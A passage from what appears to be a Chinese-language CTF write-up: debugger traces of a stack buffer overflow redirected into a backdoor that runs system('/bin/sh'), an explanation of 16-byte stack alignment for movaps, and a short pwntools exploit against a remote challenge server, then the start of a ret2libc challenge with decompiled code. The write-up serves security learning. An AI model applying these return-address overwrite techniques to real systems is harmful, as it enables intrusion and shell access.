0x7ffc20be25c0 —▸ 0x7ffc20be2620 ◂— 0<br> RSP  0x7ffc20be24e8 —▸ 0x56531f60090e (func1+30) ◂— nop<br> RIP  0x7f495329ca61 (read+17) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */<br>──────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────<br> ► 0x7f495329ca61 &lt;read+17&gt;     cmp    rax, -0x1000     0xfffffffffffffe00 - -0x1000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]<br>   0x7f495329ca67 &lt;read+23&gt;   ✔ ja     read+104                    &lt;read+104&gt;<br>    ↓<br>   0x7f495329cab8 &lt;read+104&gt;    mov    rdx, qword ptr [rip + 0xe7339]     RDX, [_GLOBAL_OFFSET_TABLE_+632] =&gt; 0xffffffffffffff88<br>   0x7f495329cabf &lt;read+111&gt;    neg    eax<br>   0x7f495329cac1 &lt;read+113&gt;    mov    dword ptr fs:[rdx], eax            [0x7f495317e6c8] &lt;= 0x200<br>   0x7f495329cac4 &lt;read+116&gt;    mov    rax, 0xffffffffffffffff            RAX =&gt; 0xffffffffffffffff<br>   0x7f495329cacb &lt;read+123&gt;    ret                                &lt;func1+30&gt;<br>    ↓<br>   0x56531f60090e &lt;func1+30&gt;    nop<br>   0x56531f60090f &lt;func1+31&gt;    leave<br>   0x56531f600910 &lt;func1+32&gt;    ret                                &lt;main+34&gt;<br>    ↓<br>   0x56531f6009f6 &lt;main+34&gt;     mov    eax, 0     EAX =&gt; 0<br>────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7ffc20be24e8 —▸ 0x56531f60090e (func1+30) ◂— nop<br>01:0008│ rsi 0x7ffc20be24f0 ◂— 0<br>02:0010│-018 0x7ffc20be24f8 —▸ 0x7f49533d3000 (_rtld_global) —▸ 0x7f49533d42e0 —▸ 0x56531f600000 ◂— jg 0x56531f600047<br>03:0018│-010 0x7ffc20be2500 —▸ 0x7ffc20be2510 —▸ 0x7ffc20be2520 —▸ 0x7ffc20be25c0 —▸ 0x7ffc20be2620 ◂— ...<br>04:0020│-008 0x7ffc20be2508 —▸ 0x56531f6009be (out+76) ◂— nop<br>05:0028│ rbp 0x7ffc20be2510 —▸ 0x7ffc20be2520 —▸ 0x7ffc20be25c0 —▸ 0x7ffc20be2620 ◂— 0<br>06:0030│+008 0x7ffc20be2518 —▸ 0x56531f6009f6 (main+34) ◂— mov eax, 0<br>07:0038│+010 0x7ffc20be2520 —▸ 0x7ffc20be25c0 —▸ 0x7ffc20be2620 ◂— 0<br>──────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────<br> ► 0   0x7f495329ca61 read+17<br>   1   0x56531f60090e func1+30<br>   2   0x56531f6009f6 main+34<br>   3   0x7f49531ab1ca __libc_start_call_main+122<br>   4   0x7f49531ab28b __libc_start_main+139<br>   5   0x56531f6007e9 _start+41<br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br></code></pre></td></tr></table></figure><p><strong>说实话，我不知道给我干哪来了，这还是国内吗？</strong></p><p>反正应该就是读取前吧</p><p>送入payload1后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>RAX: 0x29 (&#x27;)&#x27;)<br>RBX: 0x7ffc20be2648 --&gt; 0x7ffc20be41b3 (&quot;./attachment&quot;)<br>RCX: 0x7f495329ca61 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)<br>RDX: 0x40 (&#x27;@&#x27;)<br>RSI: 0x7ffc20be24f0 (&#x27;a&#x27; &lt;repeats 40 times&gt;, &quot;\311\t`\037SV&quot;)<br>RDI: 0x0<br>RBP: 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)<br>RSP: 0x7ffc20be2520 --&gt; 0x7ffc20be25c0 --&gt; 0x7ffc20be2620 --&gt; 0x0<br>RIP: 0x56531f6009c9 (&lt;backdoor+8&gt;:      add    DWORD PTR [rax],eax)<br>R8 : 0xc (&#x27;\x0c&#x27;)<br>R9 : 0x7f49533a0380 (&lt;_dl_fini&gt;:        endbr64)<br>R10: 0x7f49531919d8 --&gt; 0x11001200001bd3<br>R11: 0x246<br>R12: 0x1<br>R13: 0x0<br>R14: 0x0<br>R15: 0x7f49533d3000 --&gt; 0x7f49533d42e0 --&gt; 0x56531f600000 --&gt; 0x10102464c457f<br>EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>=&gt; 0x56531f6009c9 &lt;backdoor+8&gt;: add    DWORD PTR [rax],eax<br>   0x56531f6009cb &lt;backdoor+10&gt;:        add    al,ch<br>   0x56531f6009cd &lt;backdoor+12&gt;:        lahf<br>   0x56531f6009ce &lt;backdoor+13&gt;:        std<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7ffc20be2520 --&gt; 0x7ffc20be25c0 --&gt; 0x7ffc20be2620 --&gt; 0x0<br>0008| 0x7ffc20be2528 --&gt; 0x7f49531ab1ca (&lt;__libc_start_call_main+122&gt;:  mov    edi,eax)<br>0016| 0x7ffc20be2530 --&gt; 0x7ffc20be2570 --&gt; 0x0<br>0024| 0x7ffc20be2538 --&gt; 0x7ffc20be2648 --&gt; 0x7ffc20be41b3 (&quot;./attachment&quot;)<br>0032| 0x7ffc20be2540 --&gt; 0x11f600040<br>0040| 0x7ffc20be2548 --&gt; 0x56531f6009d4 (&lt;main&gt;:        push   rbp)<br>0048| 0x7ffc20be2550 --&gt; 0x7ffc20be2648 --&gt; 0x7ffc20be41b3 (&quot;./attachment&quot;)<br>0056| 0x7ffc20be2558 --&gt; 0x81cc8af4cf836652<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x000056531f6009c9 in backdoor ()<br>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA<br>─────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────<br>*RAX  0x29<br> RBX  0x7ffc20be2648 —▸ 0x7ffc20be41b3 ◂— &#x27;./attachment&#x27;<br> RCX  0x7f495329ca61 (read+17) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */<br> RDX  0x40<br> RDI  0<br> RSI  0x7ffc20be24f0 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)<br> R8   0xc<br> R9   0x7f49533a0380 (_dl_fini) ◂— endbr64<br> R10  0x7f49531919d8 ◂— 0x11001200001bd3<br> R11  0x246<br> R12  1<br> R13  0<br> R14  0<br> R15  0x7f49533d3000 (_rtld_global) —▸ 0x7f49533d42e0 —▸ 0x56531f600000 ◂— jg 0x56531f600047<br>*RBP  0x6161616161616161 (&#x27;aaaaaaaa&#x27;)<br>*RSP  0x7ffc20be2520 —▸ 0x7ffc20be25c0 —▸ 0x7ffc20be2620 ◂— 0<br>*RIP  0x56531f6009c9 (backdoor+8) ◂— add dword ptr [rax], eax<br>──────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────<br> ► 0x56531f6009c9 &lt;backdoor+8&gt;     add    dword ptr [rax], eax<br>   0x56531f6009cb &lt;backdoor+10&gt;    add    al, ch<br>   0x56531f6009cd &lt;backdoor+12&gt;    lahf<br>   0x56531f6009ce &lt;backdoor+13&gt;    std<br><br><br><br><br><br><br><br>────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7ffc20be2520 —▸ 0x7ffc20be25c0 —▸ 0x7ffc20be2620 ◂— 0<br>01:0008│     0x7ffc20be2528 —▸ 0x7f49531ab1ca (__libc_start_call_main+122) ◂— mov edi, eax<br>02:0010│     0x7ffc20be2530 —▸ 0x7ffc20be2570 ◂— 0<br>03:0018│     0x7ffc20be2538 —▸ 0x7ffc20be2648 —▸ 0x7ffc20be41b3 ◂— &#x27;./attachment&#x27;<br>04:0020│     0x7ffc20be2540 ◂— 0x11f600040 /* &#x27;@&#x27; */<br>05:0028│     0x7ffc20be2548 —▸ 0x56531f6009d4 (main) ◂— push rbp<br>06:0030│     0x7ffc20be2550 —▸ 0x7ffc20be2648 —▸ 0x7ffc20be41b3 ◂— &#x27;./attachment&#x27;<br>07:0038│     0x7ffc20be2558 ◂— 0x81cc8af4cf836652<br>──────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────<br> ► 0   0x56531f6009c9 backdoor+8<br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br></code></pre></td></tr></table></figure><p>反正看gdb的调试情况确实跳转到后门函数里面了，但是程序却死了</p><p>这个时候就具体看看汇编的代码：<br>assembly_backdoor:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000000009C1                 public backdoor<br>.text:00000000000009C1 backdoor        proc near<br>.text:00000000000009C1 ; __unwind &#123;<br>.text:00000000000009C1                 push    rbp<br>.text:00000000000009C2                 mov     rbp, rsp<br>.text:00000000000009C5                 lea     rdi, command    ; &quot;/bin/sh&quot;<br>.text:00000000000009CC                 call    _system<br>.text:00000000000009D1                 nop<br>.text:00000000000009D2                 pop     rbp<br>.text:00000000000009D3                 retn<br>.text:00000000000009D3 ; &#125; // starts at 9C1<br>.text:00000000000009D3 backdoor        endp<br></code></pre></td></tr></table></figure><p>如果将溢出的返回地址改为后门的首地址，即b’\xc1’</p><p>再进行动调</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pwndbg&gt; c<br>Continuing.<br><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7f78bff7dd58 --&gt; 0x7ffce80bf788 --&gt; 0x7ffce80c11c0 (&quot;SHELL=/bin/bash&quot;)<br>RBX: 0x7ffce80bf4b8 --&gt; 0xc (&#x27;\x0c&#x27;)<br>RCX: 0x7ffce80bf4b8 --&gt; 0xc (&#x27;\x0c&#x27;)<br>RDX: 0x0<br>RSI: 0x7f78bff3e42f --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>RDI: 0x7ffce80bf2a4 --&gt; 0xc00005565 (&#x27;eU&#x27;)<br>RBP: 0x7ffce80bf318 --&gt; 0x0<br>RSP: 0x7ffce80bf298 --&gt; 0x7ffce80bf620 --&gt; 0x7ffce80bf778 --&gt; 0x7ffce80c11b3 (&quot;./attachment&quot;)<br>RIP: 0x7f78bfdcb43b (&lt;do_system+363&gt;:   movaps XMMWORD PTR [rsp+0x50],xmm0)<br>R8 : 0x7ffce80bf2e8 --&gt; 0xffffffff<br>R9 : 0x7ffce80bf788 --&gt; 0x7ffce80c11c0 (&quot;SHELL=/bin/bash&quot;)<br>R10: 0x8<br>R11: 0x246<br>R12: 0x556507a00b5b --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)<br>R13: 0x0<br>R14: 0x0<br>R15: 0x7f78bffc5000 --&gt; 0x7f78bffc62e0 --&gt; 0x556507a00000 --&gt; 0x10102464c457f<br>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7f78bfdcb428 &lt;do_system+344&gt;:      lea    rsi,[rip+0x173000]        # 0x7f78bff3e42f<br>   0x7f78bfdcb42f &lt;do_system+351&gt;:      mov    QWORD PTR [rsp+0x70],0x0<br>   0x7f78bfdcb438 &lt;do_system+360&gt;:      mov    r9,QWORD PTR [rax]<br>=&gt; 0x7f78bfdcb43b &lt;do_system+363&gt;:      movaps XMMWORD PTR [rsp+0x50],xmm0<br>   0x7f78bfdcb440 &lt;do_system+368&gt;:      call   0x7f78bfe81ca0 &lt;__GI___posix_spawn&gt;<br>   0x7f78bfdcb445 &lt;do_system+373&gt;:      mov    rdi,rbx<br>   0x7f78bfdcb448 &lt;do_system+376&gt;:      mov    r12d,eax<br>   0x7f78bfdcb44b &lt;do_system+379&gt;:      call   0x7f78bfe82180 &lt;__posix_spawnattr_destroy&gt;<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7ffce80bf298 --&gt; 0x7ffce80bf620 --&gt; 0x7ffce80bf778 --&gt; 0x7ffce80c11b3 (&quot;./attachment&quot;)<br>0008| 0x7ffce80bf2a0 --&gt; 0x5565ffffffff<br>0016| 0x7ffce80bf2a8 --&gt; 0xc (&#x27;\x0c&#x27;)<br>0024| 0x7ffce80bf2b0 --&gt; 0x7f78bff92380 (&lt;_dl_fini&gt;:    endbr64)<br>0032| 0x7ffce80bf2b8 --&gt; 0x7f78bffc6680 --&gt; 0x7f78bffc65d8 --&gt; 0x7f78bff8b6c0 --&gt; 0x7f78bffc62e0 --&gt; 0x556507a00000 (--&gt; ...)<br>0040| 0x7ffce80bf2c0 --&gt; 0x7ffce80bf2f0 --&gt; 0x7f78bfd870c8 --&gt; 0x110012000007e6<br>0048| 0x7ffce80bf2c8 --&gt; 0x7f7800000001<br>0056| 0x7ffce80bf2d0 --&gt; 0x7f78bffc62e0 --&gt; 0x556507a00000 --&gt; 0x10102464c457f<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x00007f78bfdcb43b in do_system (line=0x556507a00b5b &quot;/bin/sh&quot;) at ../sysdeps/posix/system.c:148<br>warning: 148    ../sysdeps/posix/system.c: No such file or directory<br>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA<br>─────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────<br>*RAX  0x7f78bff7dd58 (environ) —▸ 0x7ffce80bf788 —▸ 0x7ffce80c11c0 ◂— &#x27;SHELL=/bin/bash&#x27;<br>*RBX  0x7ffce80bf4b8 ◂— 0xc /* &#x27;\x0c&#x27; */<br>*RCX  0x7ffce80bf4b8 ◂— 0xc /* &#x27;\x0c&#x27; */<br>*RDX  0<br>*RDI  0x7ffce80bf2a4 ◂— 0xc00005565 /* &#x27;eU&#x27; */<br>*RSI  0x7f78bff3e42f ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */<br>*R8   0x7ffce80bf2e8 ◂— 0xffffffff<br>*R9   0x7ffce80bf788 —▸ 0x7ffce80c11c0 ◂— &#x27;SHELL=/bin/bash&#x27;<br>*R10  8<br> R11  0x246<br>*R12  0x556507a00b5b ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */<br> R13  0<br> R14  0<br> R15  0x7f78bffc5000 (_rtld_global) —▸ 0x7f78bffc62e0 —▸ 0x556507a00000 ◂— jg 0x556507a00047<br>*RBP  0x7ffce80bf318 ◂— 0<br>*RSP  0x7ffce80bf298 —▸ 0x7ffce80bf620 —▸ 0x7ffce80bf778 —▸ 0x7ffce80c11b3 ◂— &#x27;./attachment&#x27;<br>*RIP  0x7f78bfdcb43b (do_system+363) ◂— movaps xmmword ptr [rsp + 0x50], xmm0<br>──────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────<br> ► 0x7f78bfdcb43b &lt;do_system+363&gt;    movaps xmmword ptr [rsp + 0x50], xmm0     &lt;[0x7ffce80bf2e8] not aligned to 16 bytes&gt;<br>   0x7f78bfdcb440 &lt;do_system+368&gt;    call   posix_spawn                 &lt;posix_spawn&gt;<br><br>   0x7f78bfdcb445 &lt;do_system+373&gt;    mov    rdi, rbx<br>   0x7f78bfdcb448 &lt;do_system+376&gt;    mov    r12d, eax<br>   0x7f78bfdcb44b &lt;do_system+379&gt;    call   posix_spawnattr_destroy     &lt;posix_spawnattr_destroy&gt;<br><br>   0x7f78bfdcb450 &lt;do_system+384&gt;    test   r12d, r12d<br>   0x7f78bfdcb453 &lt;do_system+387&gt;    je     do_system+632               &lt;do_system+632&gt;<br><br>   0x7f78bfdcb459 &lt;do_system+393&gt;    mov    dword ptr [rsp + 8], 0x7f00<br>   0x7f78bfdcb461 &lt;do_system+401&gt;    xor    eax, eax                                  EAX =&gt; 0<br>   0x7f78bfdcb463 &lt;do_system+403&gt;    mov    edx, 1                                    EDX =&gt; 1<br>   0x7f78bfdcb468 &lt;do_system+408&gt;    lock cmpxchg dword ptr [rip + 0x1ad070], edx<br>────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────<br>00:0000│ rsp   0x7ffce80bf298 —▸ 0x7ffce80bf620 —▸ 0x7ffce80bf778 —▸ 0x7ffce80c11b3 ◂— &#x27;./attachment&#x27;<br>01:0008│ rdi-4 0x7ffce80bf2a0 ◂— 0x5565ffffffff<br>02:0010│-070   0x7ffce80bf2a8 ◂— 0xc /* &#x27;\x0c&#x27; */<br>03:0018│-068   0x7ffce80bf2b0 —▸ 0x7f78bff92380 (_dl_fini) ◂— endbr64<br>04:0020│-060   0x7ffce80bf2b8 —▸ 0x7f78bffc6680 —▸ 0x7f78bffc65d8 —▸ 0x7f78bff8b6c0 —▸ 0x7f78bffc62e0 ◂— ...<br>05:0028│-058   0x7ffce80bf2c0 —▸ 0x7ffce80bf2f0 —▸ 0x7f78bfd870c8 ◂— 0x110012000007e6<br>06:0030│-050   0x7ffce80bf2c8 ◂— 0x7f7800000001<br>07:0038│-048   0x7ffce80bf2d0 —▸ 0x7f78bffc62e0 —▸ 0x556507a00000 ◂— jg 0x556507a00047<br>──────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────<br> ► 0   0x7f78bfdcb43b do_system+363<br>   1   0x556507a009d1 backdoor+16<br>   2   0x7ffce80bf6f0 None<br>   3   0x7f78bfd9d1ca __libc_start_call_main+122<br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br></code></pre></td></tr></table></figure><p>观察到程序卡在了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7f78bfdcb43b &lt;do_system+363&gt;    movaps xmmword ptr [rsp + 0x50], xmm0     &lt;[0x7ffce80bf2e8] not aligned to 16 bytes&gt;<br></code></pre></td></tr></table></figure><p>这说明没有对齐栈,system()要求16字节对齐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop rbp<br></code></pre></td></tr></table></figure><p>改变了原本对齐的结果使得低十六位不为0</p><p>所以system()卡住了，backdoor函数改变了栈的结构</p><p>最后使得rsp没有十六进制对齐</p><p>所以要跳过前两个保存栈帧的语句</p><p>也就是将b’\xc1’改成b’\xc5’，从而跳过保留栈帧的语句</p><p>最终的题解如下</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r = remote(&#x27;node2.anna.nssctf.cn&#x27;,28306)<br><br>backdoor_addr = b&#x27;\xc5&#x27;<br><br>payload1 = b&#x27;a&#x27;* (0x20+0x8) + backdoor_addr<br>pause()<br>r.send(payload1)<br>sleep(0.5)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="栈对齐–getshell的临门一脚"><a href="#栈对齐–getshell的临门一脚" class="headerlink" title="栈对齐–getshell的临门一脚"></a><strong>栈对齐</strong>–getshell的临门一脚</h4><p>64位ubuntu系统调用system函数时是需要栈对齐的。</p><p>再具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐，说简单一点就是在将要调用system函数的时候，rsp指向的地址末尾需是0。</p><p>在64位程序中，栈地址的最后一位不是0就是8</p><p>详细原理介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">► 0x7f78bfdcb43b &lt;do_system+363&gt;    movaps xmmword ptr [rsp + 0x50], xmm0     &lt;[0x7ffce80bf2e8] not aligned to 16 bytes&gt;<br></code></pre></td></tr></table></figure><p><strong>将xmm0中保存的单精度浮点数从xmm0移动至地址[rsp + 0x50]处</strong> </p><p>当然，更重要的是这条指令的执行条件，这直接关系到程序报错的原因。</p><p>当内存地址作为操作数时，内存地址必须对齐 <strong>16Byte</strong> 、 <strong>32Byte</strong> 或 <strong>64Byte</strong> 。这里所说的对齐 <strong>xByte</strong>，就是指地址必须是 <strong>x</strong> 的倍数。</p><p>使用 <strong>XMM</strong> 时，需要 <strong>16Byte</strong> 对齐；使用 <strong>YMM</strong> 时，需要 <strong>32Byte</strong> 对齐；使用 <strong>ZMM</strong> 时，需要 <strong>64Byte</strong> 对齐。</p><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><h3 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h3><p>IDA_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)read_count() )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        flower();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        books();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        hell_money();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        clothing();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        shop();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">6u</span>:<br>        check_money();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">7u</span>:<br>        see_it();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choose&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_menu:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to shop, what do you buy?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.flowers&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.books&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.hell money&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.clothing&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5.buy my shop&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;6.check youer money&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_flower:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 